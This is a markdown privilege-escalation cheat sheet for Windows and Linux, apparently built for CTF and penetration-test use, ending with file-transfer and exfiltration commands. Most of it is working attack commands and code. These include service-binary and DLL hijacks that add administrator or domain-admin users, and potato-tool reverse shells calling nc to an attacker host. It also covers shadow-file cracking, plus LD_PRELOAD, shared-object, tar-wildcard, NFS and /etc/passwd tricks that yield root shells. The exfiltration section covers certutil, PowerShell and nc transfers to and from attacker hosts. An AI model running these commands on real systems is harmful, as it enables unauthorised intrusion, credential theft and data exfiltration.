# Privilege Escalation

## Windows
Credits:
[Reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

Connect to windows machine:
```
xfreerdp /v:$rhosts /u:username /p:password /drive:.,share
```

Update windows-exploit-suggester:
```
sudo python2.7 windows-exploit-suggester.py --update
```

Using Windows Exploit Suggester
```
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

### Manual

#### Users:
```
whoami
```

Powershell:
```
Get-LocalUser
```

##### Groups username is in:
```
whoami /groups
```

Powershell:
```
Get-LocalGroup
```

##### Get all system users:
```
net user
```

##### Information about a group:
```
Get-LocalGroupMember GroupName
```

##### History
Read command history:
```
Get-History
```

```
(Get-PSReadlineOption).HistorySavePath
type output
```

#### System Information:
```
systeminfo
```

##### Get patches and updates:
```
wmic qfe
```

#### Get password policy:
```
net accounts
```

#### Network

##### List all network interfaces:
```
ipconfig /all
```

##### Print routing table:
```
route print
```

##### List all active network connections:
```
netstat -ano
```

##### Arp table
```
arp -a
```

#### Programs in Windows machine
We can query two registry keys756 to list both 32-bit and 64-bit applications in the Windows Registry:

For 32-bit:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
For 64-bit:
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

#### Process Running

Check processes running in machine:
```
Get-Processes
```

Check startup programs:
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

#### Find files or directories in a machine

Find some files with extension txt and ini from `C:\`  directory:
```
Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

This one searches for a lot of extentions:
```
Get-ChildItem -Path C:\Users\user\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Checking ownership of a file:
```
dir /q C:\Path\to\file.ext
```


Try to run some commands as another user (this on pops another terminal so you show use Windows GUI):
```
runas /user:user cmd
```

Enter as another user:
```
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("username", $password)
Enter-PSSession -ComputerName ComputerName -Credential $cred
```

Using evil-winrm for a remote connection:
```
evil-winrm -i $rhosts -u username -p "password"
```

### Automated scripts
Using [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20231015-0ad0e48c)
```
.\winPEASx64.exe
```
NOTE: Remember to use the correspondent winPEAS for your local system.

NOTE2: Remember to get another shell (from msfvenom) to use winPEAS, because sometimes your reverse_shell could crash.

NOTE3: Use it from a bash terminal, because it's colors are configured to be seen from a bash terminal.

### Windows Services

Start a service
```
sc start service
```
Stop a service:
```
sc stop service
```

#### Hijack service Binaries

Replace a binary:
```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Modify a service binary path:
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

#### Hijack service DLLs

Generating a malicious DLL
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

#### Abuse Unquoted service paths

Search for unquoted service paths
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Other Components

#### Scheduled Tasks
```
schtasks /query /fo LIST /v
```

In powershell:
```
Get-ScheduledTask | select TaskName,State
```

#### SeImpersonate Privilege

##### [JuicyPotato](https://github.com/ohpe/juicy-potato)
```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe $lhost $lport -e cmd.exe" -t * <-c "{clsid}">
```

[list of CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

**Process creation mode (-t)**
depending on the impersonated user's privileges you can choose from:

- CreateProcessWithToken (needs `SeImpersonate`)
- CreateProcessAsUser (needs `SeAssignPrimaryToken`)
- both

##### [PrintSpoofer64](https://github.com/itm4n/PrintSpoofer)
From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.
```
.\PrintSpoofer64.exe -c "C:\path\to\nc.exe $lhost $lport -e cmd"
```

```
.\PrintSpoofer64.exe -i -c powershell.exe
```

Releases [link](https://github.com/itm4n/PrintSpoofer/releases).

##### [GodPotato](https://github.com/BeichenDream/GodPotato)
Affected version: Windows Server 2012 - Windows Server 2022 and Windows 8 - Windows 11

Reverse shell:
```
.\GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe $lhost $lport"
```

#### SeLoadDriverPrivilege:

[Link here!](https://github.com/k4sth4/SeLoadDriverPrivilege)

## Linux

Credits:
[Ansible Playbook Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
## Stabilize shell:

After getting a shell, try to spawn a terminal with this command:
```
python -c "import pty;pty.spawn('/bin/bash')"
```

Enter CTRL+z and then type this command:
```
ftty raw -echo; fg
```

Set the terminal emulator to xterm:
```
export TERM=xterm
```

Done!

OR use rlwrap:
```
rlwrap nc -vnlp $lport
```

### Basic

#### hostname
```
hostname
```
PS: These could be related to the exploit (CTF perperctive)

#### kernel information
```
uname -a
```

```
cat /proc/version
```

```
lscpu
```

#### Linux Distribution
```
cat /etc/issue
```

#### Services
```
ps aux
```

#### User enumeration

Who we are?
```
whoami
```

User id:
```
id
```

What we can run as a sudo user?
```
sudo -l
```

Users in the machine:
```
cat /etc/passwd
```

Narrow users that can use bash
```
cat /etc/passwd | grep -i bash
```

#### Network

Check your network interface
```
ifconfig
```

or
```
ip a
```

Arp tables
```
arp -a
```

Routes?
```
ip route
```

Neighbors?
```
ip neigh
```

Ports open and connections that exists:
```
netstat -ano | grep -i listen
```
PS: Checks for local services (maybe need to use tunneling)


### Automated
Using linPEAS

```
./linPEAS.sh
```

### Exposed Confidential Information

Check for recursively from / and try to find some file that has password inside
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
```

Locate files with password in name
```
locate password | more
```

Search for some RSA keys
```
find / -name id_rsa 2>/dev/null
```


### Insecure File Permissions

Check if you can access /etc/shadow, /etc/sudoers, /etc/groups, ...
```
cat /etc/shadow
```

Copy /etc/passwd and /etc/shadow to files with hashes and use unshadow:
```
unshadow passwd shadow > unshadow
```

Then, use john to crack it
```
john unshadow --wordlist=/usr/share/wordlist/rockyou.txt
```

Check your history, maybe you can find some nice commands
```
history
```

or in user home directory
```
cat .bash_history
```

#### CronJobs

Check your cronjobs
```
cat /etc/crontab
```

Check if you can overwrite the script that is running via cronjob.

##### Wildcards (normal with tar)

We can do injection with that
Now check your $PATH and the let's create some malicious file:

```shell
echo "cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot" > runme.sh
```

Change its permission to execution:
```
chmod +x runme.sh
```

Now, tar specific commands:

```
touch /full/path/to/--checkpoint=1
```

```
touch /full/path/to/--checkpoint-action=exec=sh\runme.sh
```

Explanation:
The first command means that you display progress messages every 1 record.
And then, when you reach this checkpoint, run this command.

##### Cron File overwrite (script files)

It is simple.
Check if you can overwrite a file and if you want to use a reverse shell.
If so, check if you have nc, socat or bash.
Then you can do like this:

```
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /full/path/to/binary.sh
```

##### Check for some cronjobs out of crontab

[pspy](https://github.com/DominicBreuker/pspy)
Just run it!
```
./pspy64
```

Wait some time and the you will see something going on.

#### Password Authentication

### Insecure System Components

#### sudo -l

##### LD_PRELOAD
check if there is a env_keep+=LD_PRELOAD, then we can execute our own library with sudo.

shell.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
  unsetenv("LD_PRELOAD");
  # this indicates root user!
  setgid(0);
  setuid(0);
  system("/bin/bash");
}

```
Save this file or upload it to machine

Compiling:
```
gcc -fPIC -share -o shell.so shell.c -nostartfiles
```

Run the command:
```
sudo LD_PRELOAD=/full/path/to/shell.so (something that we can run as sudo!)
```

#### NFS Root Squash

Check if there is a vulnerability here:
```
cat /etc/export
```

If you have some folder with no_root_squash, then you can mount that folder

Check if you can mount something
```
showmount -e $rhost
```

Create folder for remote folder
```
mkdir mountme
```

Mount that folder
```
mount -o rw,vers=2 $rhost:/remotedir /full/path/to/mountme
```

Let's create a malicious file:
```
echo "int main(){ setgid(0); setuid(0); system('/bin/bash'); return 0;}" > /mountme/x.c
```

Let's gcc this:
```
gcc /mountme/x.c -o /mountme/x
```

Then's let's use the chmod +s:
```
chmod +s x
```

Then, in your remote machine, run your x file to get root.

#### Setuid Binaries and Capabilities

```
find / -perm -u=s -type f 2>/dev/null
```

Check in [GTFOBins](https://gtfobins.github.io)

##### systemctl

[Here is a link!](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)

##### cp
```
cat /etc/passwd > passwd.orig
```
New password:
```
openssl passwd <Enter your password>
```

Get this output and use

Add the new user to passwd.orig
```
echo "root2:<openssl(your_password)>:0:0:root:/root:/bin/bash" >> passwd.orig
```

Copy your new passwd file:
```
cp passwd.orig /etc/passwd
```

Now you got root2 access!
```
su root2
```
##### SO Injection

Try to run the program with strace (local):
```
strace /that/program 2>&1 | grep -i  -E "open|access|no such file"
```
Then, try to find files that you can overwrite.

your file in c, for example, library.c:
```c
# include <stdio.h>
# include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
  system("cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot");
}
```

Compile it:
```
gcc -fPIC -share -o /path/to/library/library.so library.c
```

Run that suid file and then go to /tmp and access with:
```
./bashroot -p
```

##### Environment Variables

###### No full path service

Let's exploit $PATH!
Check if the program uses a binary that is not been executed via full path.
Then, let's change the PATH

```
export PATH=/tmp:$PATH
```
Check your PATH env!

Let's create a malicious file:
```shell
echo "int main(){ setgid(0); setuid(0); system('/bin/bash'); return 0;}" > /tmp/service.c
```

Let's compile it:
```
gcc /tmp/service.c -o /tmp/service
```

Now, let's run our binary and the we get root!

###### Malicious function (when we have a service has a full path)

Other way is creating a malicious function (for example /usr/sbin/service):

```shell
function /usr/sbin/service() {cp /bin/bash /tmp/bashroot && chmod +s /tmp/bashroot && /tmp/bashroot -p;}
```

Now let's export it:
```
export -f /usr/sbin/service
```

Now, call your suid binary and you get a root!

#### Capabilities

Check for capabilities:
```
getcap -r / 2>/dev/null
```

#### Kernel Exploits

[lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

##### Dirty Pipe

##### Polkit

# Metasploit

Privilege Escalation
```
search local_exploit_suggester
```
NOTE: Remember to use migrate to move the execution of the meterpreter payload.

# Exfiltration Data

## Windows

CMD
```
certutil -urlcache -split -f http://$lhost:$lport/file.ext file.ext
```

Powershell
```
iwr -uri http://$lhost:$lport/file.ext -OutFile file.ext
(New-Object Net.WebClient).DownloadFile("http://$lhost:$lport/file.ext","C:\path\to\file.ext")
Invoke-WebRequest "http://$lhost:$lport/file.ext" -OutFile "file.ext"
```

### SMB

Copy files from Kali to Windows:
```
copy \\$lhost\sharename\file.ext file.ext
```

Copy file from Windows to Kali:
```
copy file.ext \\$lhost\sharename\file.ext
```


## Linux

```
wget http://$lhost:$lport/file.ext
curl http://$lhost:$lport/file.ext -o /path/to/file.ext
```

### SCP

Credits:
[How to Use SCP Command for File Transfer](https://www.hostinger.com/tutorials/using-scp-command-to-transfer-files/#:~:text=SCP%20(secure%20copy%20protocol)%20is,for%20your%20data%20and%20credentials.)

Copying from a local server to a remote host and can use `-r` to copy multiple files or subdirectories:
```
scp -P [-r] 2222 /users/Hostinger/desktop/scp.zip root@191.162.0.2:/writing/article
```

Transferring a Remote File to a Local Machine
```
scp root@191.162.0.2:/writing/articles/SCP.zip Users/Hostinger/Desktop
```

Safely Moving a File Between Remote Hosts
```
scp root@191.162.0.2:/writing/article/scp.zip hostinger@11.10.0.1:/publishing
```

### nc
Machine that you have a file:
```
nc -lvnp $lport > new_file
```

Machine that you want a file to be transfered:
```
nc -vn <IP> $lport < exfil_file
```

### SMB

Via set a smbserver impacket-smbserver:
```
impacket-smbserver -smb2support sharename /path/to/share
```

Then, use copy to get the file
